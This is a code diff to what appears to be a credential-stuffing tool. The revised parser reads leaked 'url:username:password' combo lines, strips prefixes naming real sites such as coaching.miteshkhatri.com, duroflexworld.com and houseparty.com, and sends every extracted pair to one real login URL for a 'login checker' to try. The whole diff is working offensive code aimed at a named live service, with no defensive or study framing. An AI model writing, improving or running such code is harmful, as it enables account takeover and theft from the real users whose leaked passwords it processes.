@@ -210,33 +210,98 @@ def is_cooled(domain):
 # ============ PARSER ============
 
 def parse_line(line):
+    """Smart parser - handles ANY format automatically"""
     line = line.strip()
     if not line or line.startswith('#'):
         return None
     
-    parts = line.split(':')
-    if len(parts) < 3:
+    LOGIN_URL = "https://coaching.miteshkhatri.com/login"
+    
+    try:
+        # Remove all URL patterns
+        url_patterns = [
+            'https://coaching.miteshkhatri.com/password/edit:',
+            'https://coaching.miteshkhatri.com/password:',
+            'https://coaching.miteshkhatri.com/login:',
+            'https://coaching.miteshkhatri.com/sign_up:',
+            'https://coaching.miteshkhatri.com/:',
+            'https://coaching.miteshkhatri.com:',
+            'http://coaching.miteshkhatri.com/login:',
+            'http://coaching.miteshkhatri.com:',
+            'coaching.miteshkhatri.com/login:',
+            'coaching.miteshkhatri.com/password/edit:',
+            'coaching.miteshkhatri.com/password:',
+            'coaching.miteshkhatri.com/sign_up:',
+            'coaching.miteshkhatri.com:',
+            'community.miteshkhatri.com/sign_up:',
+            'community.miteshkhatri.com/:',
+            'community.miteshkhatri.com:',
+            'partners.miteshkhatri.com:',
+            'https://community.miteshkhatri.com/sign_up:',
+            'https://community.miteshkhatri.com/:',
+            'https://community.miteshkhatri.com:',
+            'https://www.duroflexworld.com:',
+            'https://app.joinsuperset.com:',
+            'https://app.houseparty.com:',
+            'https://citymall.com.mm/citymart_en/customer/account/create:',
+        ]
+        
+        cleaned = line
+        
+        for pattern in url_patterns:
+            if cleaned.startswith(pattern):
+                cleaned = cleaned[len(pattern):]
+                break
+        
+        # Handle URL at end
+        parts = cleaned.split(':')
+        if len(parts) >= 3:
+            last_part = parts[-1].lower()
+            if 'miteshkhatri' in last_part or last_part.startswith('http'):
+                cleaned = ':'.join(parts[:-1])
+        
+        if not cleaned or cleaned == ':':
+            return None
+        
+        # Split username:password
+        if cleaned.count(':') == 1:
+            username, password = cleaned.split(':')
+        else:
+            # Multiple colons - find email boundary
+            if '@' in cleaned:
+                at_pos = cleaned.find('@')
+                # Find : after @
+                colon_pos = cleaned.find(':', at_pos)
+                if colon_pos != -1:
+                    username = cleaned[:colon_pos]
+                    password = cleaned[colon_pos + 1:]
+                else:
+                    username, password = cleaned.split(':', 1)
+            else:
+                username, password = cleaned.split(':', 1)
+        
+        username = username.strip().rstrip('/').rstrip(':')
+        password = password.strip().rstrip('/').rstrip(':')
+        
+        # Validate
+        if not username or not password:
+            return None
+        if username.lower() == 'unknown':
+            return None
+        if username in ['loa', 'http', 'https']:
+            return None
+        if 'miteshkhatri' in username or 'http' in username:
+            return None
+        if 'miteshkhatri' in password or password.startswith('http'):
+            return None
+        if len(username) < 2:
+            return None
+        
+        return (LOGIN_URL, username, password)
+        
+    except Exception as e:
+        logger.debug(f"Parse error: {e}")
         return None
-    
-    url = parts[0]
-    rest = ':'.join(parts[1:])
-    creds = rest.rsplit(':', 1)
-    if len(creds) != 2:
-        return None
-    
-    return (clean_url(url), creds[0], creds[1])
-
-def clean_url(url):
-    url = url.strip().lower()
-    if not url.startswith('http'):
-        url = 'https://' + url
-    
-    if '/wp-login.php' not in url:
-        url = url.rstrip('/') + '/wp-login.php'
-    else:
-        url = url.split('?')[0]
-    
-    return url
 
 # ============ LOGIN CHECKER ============
 
